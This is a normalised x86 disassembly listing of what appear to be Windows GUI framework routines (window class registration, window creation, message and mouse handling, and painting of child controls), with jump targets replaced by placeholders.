mov eax edi
call sub_44cf20
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44d394
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_44afd4
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax esi
call sub_450a20
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_44d20c
mov eax ebp
call sub_44dc74
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44d278
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_44afd4
mov eax esi
call sub_44cfdc
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44a268
sub_44d410
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4185b0
mov edx edi
mov eax ebp
call sub_4185b0
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44d46c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_44d44c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_44d410
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_44d4ac
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_44d46c
add esp 0x10
retn
sub_44d4d4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44d540
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44a464
test al al
je r-xdata
mov eax ebx
call sub_44a494
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403350
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403350
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403350
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_44d5a8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44d6c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b5c
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44d540
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_45071c
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030a4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041b4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4087b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d6cd
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_44d6d4
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44d895
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_446c14
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_446c14
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405c80
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6e4
call sub_403908
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cbd4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cbd4
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408964
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_450a2c
push 0x1
mov eax [ esi + 0x68 ]
call sub_42403c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_44afd4
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_45071c
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d89c
lea eax [ ebp - 0xc0 ]
call sub_403f50
retn
mov eax esi
mov si 0xffee
call sub_403350
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_44d8a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406b6c
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_44d8e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41cd18
mov eax esi
call sub_41cc68
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41cc68
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41cd20
pop esi
pop ebx
retn
sub_44d91c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41ef4c
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41ee80
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41ee80
mov eax esi
call sub_41ef54
add esp 0x10
pop esi
pop ebx
retn
sub_44d984
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44d970
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4185b0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4185b0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_44da5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44b30c
mov eax [ ebp - 0x8 ]
push eax
push sub_44d8e4
mov eax [ ebp - 0x8 ]
push eax
push sub_44d91c
push ebp
call sub_44d984
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44dab8
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_449d94
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408918
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_40892c
mov ecx eax
mov edx edi
mov eax ebx
call sub_449da4
mov eax r-xdata
call sub_408938
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_448848
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_44db10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_44db5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44db64
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cbd4
sub_44db74
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_41860c
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4185b0
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44dbbc
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_44d44c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_44db74
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44d410
call sub_449474
inc edi
dec esi
jne r-xdata
sub_44dc58
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_44dc74
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4185b0
call sub_44dc74
inc edi
dec esi
jne r-xdata
sub_44dcd4
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403350
mov ebx eax
mov eax edi
call sub_44dc74
mov eax edi
call sub_44de10
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_44dd14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_44ddea
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_44afd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4185b0
call sub_44dd14
inc esi
dec ebx
jne r-xdata
sub_44de10
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032e0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44dd14
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_44de50
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_44dc74
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_44de10
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406b5c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44afd4
jmp r-xdata
sub_44ded8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40361c#9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44df1f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44df26
call sub_448848
call sub_4268ec
retn
sub_44df50
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_416efc
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406b44
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_44afd4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_44e008
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4185b0
call sub_44df50
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4185b0
call sub_44df50
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_44e09c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_45071c
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b30
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44e008
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b44
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_44afd4
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44e130
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_44a590
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_44b0a0
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44e09c
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406b30
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_449964
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44e008
test eax eax
je r-xdata
mov eax ebx
call sub_460ae8
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44b0a0
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_450a20
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_45071c
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_45071c
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_44afd4
sub_44e294
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44b234
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_44afd4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423b68
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_4247ec
call sub_423b68
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_424828
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_4499c0
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44e39c
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_446d00
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_44afd4
mov [ esi + 0xc ] eax
mov bl 0x1
sub_44e3d0
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_44e4f0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e528
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e4f7
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_45071c
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4185b0
